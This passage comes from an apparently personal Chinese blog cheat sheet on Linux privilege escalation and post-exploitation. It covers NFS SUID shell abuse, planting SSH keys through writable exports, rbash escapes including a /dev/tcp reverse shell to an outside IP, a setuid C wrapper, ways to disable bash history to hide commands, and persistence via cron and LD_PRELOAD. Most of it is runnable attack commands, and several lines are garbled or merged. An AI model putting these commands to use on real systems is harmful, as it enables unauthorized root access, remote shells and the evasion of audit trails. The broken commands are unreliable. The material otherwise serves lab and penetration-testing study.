<p>所以，也可以不需要生成一个木马的操作。我们可以直接以root用户身份复制攻击机上面的shell到共享目录中，给予suid权限，然后切换到目标机，执行该程序即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp `which sh` /tmp/nfs</span><br><span class="line">chmod +s /tmp/nfs/sh</span><br><span class="line"></span><br><span class="line">-------目标机执行</span><br><span class="line">./sh -p</span><br></pre></td></tr></table></figure>




<h4 id="共享目录可写"><a href="#共享目录可写" class="headerlink" title="共享目录可写"></a>共享目录可写</h4><p>探测可挂载的目录。 可以看到&#x2F;home&#x2F;peter允许任意IP挂载，那么我们就可以挂载之后在自己的机器上添加一个用户，去操作这个用户的文件之类的。</p>
<blockquote>
<p>注意&#x2F;home&#x2F;peter后面的星号，这意味着网络上的每台计算机都可以挂载此计算机的&#x2F;home&#x2F;peter文件夹。 如果在目录前面看到任何IP地址或IP范围定义，则意味着仅允许具有该特定IP或范围的计算机安装目录，这是一种很好的安全做法。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 111 --script=nfs* 192.168.56.7</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 07:40 EDT</span><br><span class="line">Nmap scan report for 192.168.56.7</span><br><span class="line">Host is up (0.00092s latency).</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">111/tcp open  rpcbind</span><br><span class="line">| nfs-showmount: </span><br><span class="line">|_  /home/peter *</span><br></pre></td></tr></table></figure>

<p>写入操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/homesudo mount -o nolock 192.168.56.7:/home/ /home/kali/home/</span><br><span class="line"></span><br><span class="line">sudo grounpadd -g 1005 peter</span><br><span class="line"></span><br><span class="line">sudo adduser peter -uid 1001 -gid 1005</span><br><span class="line"></span><br><span class="line">su peter</span><br><span class="line"></span><br><span class="line">ssh-keygen</span><br><span class="line"></span><br><span class="line">cat ~/home/.ssh/id_rsa.pub &gt; /home/kali/home/peter/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">ssh peter@192.168.56.7</span><br></pre></td></tr></table></figure>



<p>使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o nolock 192.168.56.7:/home/ /home/kali/home/</span><br></pre></td></tr></table></figure>

<p>挂在成功后权限位有问题(好像就只有nfs4会有问题。。)</p>
<p><img src="https://images.atsud0.me/images/post/image-20201130100953041.png" alt="image-20201130100953041"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o nolock,vers=3  192.168.56.7:/home/ /tmp/home/</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201130101625001.png" alt="image-20201130101625001"></p>
<p>共享目录可写的配置文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">peter@linsecurity:~$ cat /etc/exports</span><br><span class="line"># /etc/exports: the access control list for filesystems which may be exported</span><br><span class="line">#               to NFS clients.  See exports(5).</span><br><span class="line">#</span><br><span class="line"># Example for NFSv2 and NFSv3:</span><br><span class="line"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span><br><span class="line">#</span><br><span class="line"># Example for NFSv4:</span><br><span class="line"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span><br><span class="line"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span><br><span class="line">#</span><br><span class="line">/home/peter *(rw)</span><br></pre></td></tr></table></figure>

<h4 id="敏感信息泄露-1"><a href="#敏感信息泄露-1" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><p>挂载NFS磁盘之后找到一些密码或者是私钥等。</p>
<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><h4 id="SMB-Cry"><a href="#SMB-Cry" class="headerlink" title="SMB_Cry"></a>SMB_Cry</h4><h4 id="CVE-2010-0926-Samba-smbd默认配置目录遍历漏洞"><a href="#CVE-2010-0926-Samba-smbd默认配置目录遍历漏洞" class="headerlink" title="CVE-2010-0926 Samba smbd默认配置目录遍历漏洞 "></a><a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2010-0926/">CVE-2010-0926 Samba smbd默认配置目录遍历漏洞 </a></h4><ul>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33599">Samba 3.4.5 - Symlink Directory Traversal </a></li>
<li><a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal/">Samba 3.4.5 - Symlink Directory Traversal-Metasploit</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually">Symlink-Directory-Traversal-smb-manually</a></li>
<li><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/85957/Samba-Remote-Directory-Traversal.html">Samba-Remote-Directory-Traversal-packetstormsecurity</a></li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="rbash逃逸"><a href="#rbash逃逸" class="headerlink" title="rbash逃逸"></a>rbash逃逸</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/">rbash逃逸</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@ip -t <span class="string">&#x27;bash --noprofile&#x27;</span></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh user@ip -t <span class="string">&quot;export TERM=xterm;python -c  &#x27;import pty;pty.spawn(\&quot;/bin/bash\&quot;)&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">ssh user@ip -t <span class="string">&quot;export TERM=xterm;bash -c &#x27;bash -i &gt;&amp;/dev/tcp/192.168.119.163/80 0&gt;&amp;1&#x27;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="Bash-dropping-privileges"><a href="#Bash-dropping-privileges" class="headerlink" title="Bash dropping privileges"></a>Bash dropping privileges</h3><p>当bash运行时，它会检查$UID是否与$EUID匹配。如果没有(通常是通过suid方式提权的，就会出现这种情况)，那么bash将删除特权。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/b &amp;&amp; <span class="built_in">chmod</span> +s /tmp/b/bin/b -p <span class="comment">### 维持特权 </span></span><br></pre></td></tr></table></figure>

<p>用msf生成linux的二进制payload时可以添加<code>PrependSetuid=true</code>这个参数</p>
<p>或者加个简单的wrapper</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span>main () &#123;setuid(0);system(<span class="string">&quot;/bin/bash&quot;</span>);&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="mount-nosuid"><a href="#mount-nosuid" class="headerlink" title="mount nosuid"></a>mount nosuid</h3><p>nosuid，是linux在mount时可以添加的一个属性，该属性禁止设置 suid 操作和设定 sgid 位。<a target="_blank" rel="noopener" href="https://wiki.archlinux.org/title/Fstab_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">fstab</a></p>
<p>如果该属性被配置在了你想要操作suid提权的二进制程序的目录下的话，那么系统将会自动drop掉suid权限位。（部分系统可能会在安装初默认配置该选项如arch？（</p>
<p><img src="https://images.atsud0.me/images/post/20220712-37:2022:35-_tfzBAG_image-20220712003735034_tfzBAG_1657557455366_tfzBAG_image-20220712003735034.png" alt="image-20220712003735034"></p>
<p>可以使用命令<code>mount</code>或者是<code>findmnt</code>等命令来查看</p>
<p><img src="https://images.atsud0.me/images/post/20220712-32:2022:02-_wSOVyI_image-20220712003202392_wSOVyI_1657557122776_wSOVyI_image-20220712003202392.png" alt="image-20220712003202392"></p>
<p><img src="https://images.atsud0.me/images/post/20220712-31:2022:29-_jVr10R_image-20220712003128747_jVr10R_1657557089057_jVr10R_image-20220712003128747.png" alt="image-20220712003128747"></p>
<p>当切换到无设置nosuid参数的磁盘时，可正常提权：</p>
<p><img src="https://images.atsud0.me/images/post/20220712-40:2022:04-_dKliUL_image-20220712004003859_dKliUL_1657557604187_dKliUL_image-20220712004003859.png" alt="image-20220712004003859"></p>
<h2 id="隐藏痕迹"><a href="#隐藏痕迹" class="headerlink" title="隐藏痕迹"></a>隐藏痕迹</h2><h3 id="隐藏命令执行"><a href="#隐藏命令执行" class="headerlink" title="隐藏命令执行"></a>隐藏命令执行</h3><p>建议阅读：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://digi.ninja/blog/hiding_bash_history.php">https://digi.ninja/blog/hiding_bash_history.php</a></li>
<li><a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/histcontrol-command-in-linux-with-examples/">https://www.geeksforgeeks.org/histcontrol-command-in-linux-with-examples/</a></li>
<li><a target="_blank" rel="noopener" href="https://rockhong.github.io/history-in-bash.html">https://rockhong.github.io/history-in-bash.html</a></li>
</ul>
<p>基本概念:</p>
<blockquote>
<p>当一个正常的交互式login shell登录时，执行命令时，执行HISTSIZE条命令会被记录到缓冲区里，当你成功注销时，才会将HISTSIZE条命令写入到HISTFILE变量中的文件里面，而HISTFILE变量默认的位置就是用户家目录下的.bash_history文件。</p>
</blockquote>
<p> 知道了保存历史命令的执行过程后我们会发现几点：</p>
<ol>
<li>只有成功注销时才会写入到文件里面。</li>
<li>只会写入HISTSIZE条命令到HISTFILE文件里。</li>
</ol>
<p>  通过set命令可以快速观察到默认的环境变量设置（环境为Cetnos6）</p>
<p><img src="https://wiki.tophant.com/download/attachments/62851540/image2021-9-10_17-55-2.png?version=1&modificationDate=1631267703000&api=v2" title="安全服务 &gt; Linux下隐藏执行命令痕迹的方式整理 &gt; image2021-9-10_17-55-2.png"></p>
<p>以及观察有没有开启当前shell有没有开启history功能</p>
<p><img src="https://wiki.tophant.com/download/attachments/62851540/image2021-9-10_17-52-24.png?version=1&modificationDate=1631267545000&api=v2" title="安全服务 &gt; Linux下隐藏执行命令痕迹的方式整理 &gt; image2021-9-10_17-52-24.png"></p>
<h4 id="Bash部分环境变量"><a href="#Bash部分环境变量" class="headerlink" title="Bash部分环境变量"></a>Bash部分环境变量</h4><p>来解释一下这几个和历史命令有关的环境变量吧<br><code>HISTFILE</code>：保存历史命令的文件<br><code>HISTSIZE</code>：当前会话保存历史命令的数量<br><code>HISTFILESIZE</code>：保存历史命令的文件保存历史命令的数量<br><code>HISTIGNORE</code> ：保存历史时忽略某些命令<br><code>HISTCONTROL</code> ：保存历史时忽略某些命令组合  </p>
<h4 id="常见隐藏执行命令的方式"><a href="#常见隐藏执行命令的方式" class="headerlink" title="常见隐藏执行命令的方式"></a>常见隐藏执行命令的方式</h4><p>所以隐藏执行历史命令的命令有</p>
<p>1、在当前会话中临时取消HISTFILE变量，这样就算正常退出 历史命令也没有地方保存。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unset HISTFILE  </span><br></pre></td></tr></table></figure>

<p>2、在当前会话中临时设置HISTFILE变量，将其保存到空设备中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export HISTFILE=/dev/null</span><br></pre></td></tr></table></figure>

<p>3、在当前会话中 关闭bash的history功能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set +o history</span><br></pre></td></tr></table></figure>

<p>4、同set +o hisotry</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shopt -u -o history </span><br></pre></td></tr></table></figure>

<p>5、 通过这样打开的bash 不是login shell 也没有打开history功能可以隐藏后续执行的命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat | bash</span><br></pre></td></tr></table></figure>

<p>6、 设置当前会话的记录历史命令数量为0，当正常退出时也不会记录命令，不过想执行历史命令时会有诸多不便，因为不能通过方向键上下翻页去找自己执行过的命令。  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export HISTSIZE = 0</span><br></pre></td></tr></table></figure>

<p>7、不正常退出当前shell，比如 kill掉当前bash。</p>
<p>8、命令前带空格（非万能、非绝对可行，请看下面知识点。</p>
<p>9、退出会话前使用history -r，清除当前会话的历史命令记录</p>
<h4 id="命令前带空格的命令为什么能不被记录"><a href="#命令前带空格的命令为什么能不被记录" class="headerlink" title="命令前带空格的命令为什么能不被记录"></a>命令前带空格的命令为什么能不被记录</h4><p>前面有个很重要的知识点没说到，HISTCONTROL变量，就是这个变量的设置决定了命令前带空格是否会被忽略还是记录。</p>
<p>在Debian10中，Bash的默认<code>HISTCONTROL</code>变量为<code>ignoreboth</code>，而我在Centos6中发现Bash的默认<code>HISTCONTROL</code>是<code>ignoredups</code>。这样会造成什么样的差异呢？</p>
<p><code>ignoredups</code>是忽略连续两条以上的重复命令，<code>ignoredspace</code>是忽略命令开头带有空格的命令，而<code>ignoredboth</code>等价于<code>ignoredups</code>和<code>ignorespace</code>的组合，即忽略开头带空格的命令，又忽略连续两条以上重复的命令。</p>
<p>只有<code>HISTCONTROL=ignorespace</code>或者是<code>ignoreboth</code>时，才会忽略命令前带空格的命令。</p>
<p>所以如果当前的<code>HISTCONTROL</code>环境变量不是<code>ignoreboth</code>时，我们可以临时设置个<code>ignoreboth</code>给他，这样后续也能命令前带个空格的方式来隐藏。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export HISTCONTROL=ignoreboth</span><br></pre></td></tr></table></figure>


<p>写的有点水，，有不对的地方，还请各位师傅斧正。。</p>
<h3 id="清除记录（待填坑"><a href="#清除记录（待填坑" class="headerlink" title="清除记录（待填坑"></a>清除记录（待填坑</h3><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>匿名、免费的代码托管平台</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-   `sowcar.com` 免费图床</span><br><span class="line">-   `pastebin.com` 免费代码分享平台</span><br><span class="line">-   `paste.ubuntu.com` 免费代码分享平台</span><br></pre></td></tr></table></figure>


<h3 id="自启"><a href="#自启" class="headerlink" title="自启"></a>自启</h3><h4 id="rc-d"><a href="#rc-d" class="headerlink" title="rc.d"></a>rc.d</h4><h4 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h4><h4 id="service"><a href="#service" class="headerlink" title="service"></a>service</h4><h4 id="shell启动"><a href="#shell启动" class="headerlink" title="shell启动"></a>shell启动</h4><p>如root用户的<code>.bashrc</code></p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><h3 id="驻留"><a href="#驻留" class="headerlink" title="驻留"></a>驻留</h3><h4 id="劫持预加载动态链接库"><a href="#劫持预加载动态链接库" class="headerlink" title="劫持预加载动态链接库"></a>劫持预加载动态链接库</h4><ul>
<li>&#x2F;etc&#x2F;ld.so.preload</li>
<li>LD_PRELOAD</li>
</ul>
<p><img src="https://images.atsud0.me/images/post/20210902-14:23:46-_xNbgbE_NBFugT_xNbgbE_1630563826338_xNbgbE_NBFugT.png" alt="20210902-14:23:46-_xNbgbE_NBFugT_xNbgbE_1630563826338_xNbgbE_NBFugT"></p>
<p><img src="https://images.atsud0.me/images/post/20210902-15:47:26-_KvUzVY_q9MC5a_KvUzVY_1630568846205_KvUzVY_q9MC5a.png" alt="20210902-15:47:26-_KvUzVY_q9MC5a_KvUzVY_1630568846205_KvUzVY_q9MC5a"></p>
<p><img src="https://images.atsud0.me/images/post/20210902-14:24:53-_4gFSxZ_FASJu8_4gFSxZ_1630563893833_4gFSxZ_FASJu8.png" alt="20210902-14:24:53-_4gFSxZ_FASJu8_4gFSxZ_1630563893833_4gFSxZ_FASJu8"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md">https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</a> </li>
<li><a target="_blank" rel="noopener" href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html</a></li>
<li><a target="_blank" rel="noopener" href="https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</a></li>
<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/privescplayground">privescplayground</a></li>
<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/commonlinuxprivesc">Common Linux Privesc</a></li>
<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000019948872">NFS利用</a></li>
<li><a href="https://www.cesafe.com/html/6866.html" title="" target="">Linux NFS提权 Linux N​​FS共享权限提升</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/security/">docker-security</a></li>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40394">msf-docker</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/146799#h3-9">利用PATH环境变量进行Linux提权</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9651622.html">SUID</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/a1154490629/article/details/52190801">&#x2F;etc&#x2F;passwd</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1038337" title="" target="">动态链接共享对象库提权</a></li>
<li><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/72965.html">利用通配符实现Linux本地提权-安全脉搏</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/175453.html">如何使用Cron Jobs实现Linux提权</a></li>
<li><a target="_blank" rel="noopener" href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/">Exploiting wildcards on Linux</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">basic-linux-privilege-escalation</a></li>
<li><a target="_blank" rel="noopener" href="https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099">Day 44: Linux Capabilities Privilege Escalation via OpenSSL with SELinux Enabled and Enforced</a></li>
<li><a target="_blank" rel="noopener" href="https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099">Linux系统利用可执行文件的Capabilities实现权限提升 </a></li>
<li><a target="_blank" rel="noopener" href="https://hack-tips.com/2020/02/21/how-to-find-nfs-mounted-drives-penetration-testing/">how-to-find-nfs-mounted-drives-penetration-testing&#x2F;</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/">wget提权</a></li>
<li><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki//dev/null">&#x2F;dev&#x2F;null</a></li>
<li><a target="_blank" rel="noopener" href="http://rockhong.github.io/history-in-bash.html">Bash的history命令</a></li>
<li><a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/histcontrol-command-in-linux-with-examples/">HISTCONTROL Command in Linux with Examples</a></li>
<li><a target="_blank" rel="noopener" href="https://green-m.me/2021/11/20/privileged-by-write-file/">green-me操作 linux 文件提权</a></li>
</ul>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/links/">Friends</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">基础信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%8F%91%E8%A1%8C%E7%89%88"><span class="toc-number">1.1.</span> <span class="toc-text">判断发行版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%86%85%E6%A0%B8%E5%92%8C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">判断内核和系统位数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.</span> <span class="toc-text">网络信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%EF%BC%88%E6%9C%80%E5%A5%BD%E7%9C%8B%E7%9C%8Broot%E7%94%A8%E6%88%B7%E8%BF%90%E8%A1%8C%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">当前进程（最好看看root用户运行的进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC"><span class="toc-number">1.5.</span> <span class="toc-text">软件版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">信息收集脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LinEnum"><span class="toc-number">2.1.</span> <span class="toc-text">LinEnum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LinPEAS"><span class="toc-number">2.2.</span> <span class="toc-text">LinPEAS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-Exploit-Suggester"><span class="toc-number">2.3.</span> <span class="toc-text">Linux_Exploit_Suggester</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linuxprivchecker"><span class="toc-number">2.4.</span> <span class="toc-text">linuxprivchecker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lse"><span class="toc-number">2.5.</span> <span class="toc-text">lse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.</span> <span class="toc-text">敏感信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.1.</span> <span class="toc-text">配置文件信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-Key%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2"><span class="toc-number">3.2.</span> <span class="toc-text">SSH-Key私钥泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#openvpn"><span class="toc-number">3.3.</span> <span class="toc-text">openvpn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#history"><span class="toc-number">3.4.</span> <span class="toc-text">history</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vi-x2F-vim-swp"><span class="toc-number">3.5.</span> <span class="toc-text">vi&#x2F;vim .swp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99CMS%E7%9A%84config-php"><span class="toc-number">3.6.</span> <span class="toc-text">网站CMS的config.php</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wordpress"><span class="toc-number">3.6.1.</span> <span class="toc-text">wordpress</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">错误配置提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE-x2F-etc-x2F-passwd"><span class="toc-number">4.1.</span> <span class="toc-text">错误配置 &#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE-x2F-etc-x2F-shadow"><span class="toc-number">4.2.</span> <span class="toc-text">错误配置 &#x2F;etc&#x2F;shadow</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID%E4%BD%8D%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">SUID位二进制文件提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID-exim-CVE-2016-1531-%E6%8F%90%E6%9D%83"><span class="toc-number">5.1.</span> <span class="toc-text">SUID-exim-CVE-2016-1531 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID-nginx-CVE-2016-1247-%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.</span> <span class="toc-text">SUID nginx CVE-2016-1247 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID-suid-so-%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="toc-number">5.3.</span> <span class="toc-text">SUID suid-so 共享对象库注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID-env%E6%8F%90%E6%9D%83"><span class="toc-number">5.4.</span> <span class="toc-text">SUID env提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%B2%A1%E6%9C%89%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%9A%84service"><span class="toc-number">5.4.1.</span> <span class="toc-text">第一种没有绝对路径的service</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%9C%89%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%9A%84service"><span class="toc-number">5.4.2.</span> <span class="toc-text">第二种有绝对路径的service</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid-xxd"><span class="toc-number">5.5.</span> <span class="toc-text">suid xxd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid-taskset"><span class="toc-number">5.6.</span> <span class="toc-text">suid taskset</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid-cp"><span class="toc-number">5.7.</span> <span class="toc-text">suid cp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">sudo 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-nmap"><span class="toc-number">6.1.</span> <span class="toc-text">sudo nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap-2-02-5-21"><span class="toc-number">6.1.1.</span> <span class="toc-text">nmap 2.02 - 5.21</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap-%E8%84%9A%E6%9C%AC%E6%8F%90%E6%9D%83"><span class="toc-number">6.1.2.</span> <span class="toc-text">nmap 脚本提权</span></a></li></ol></li><li 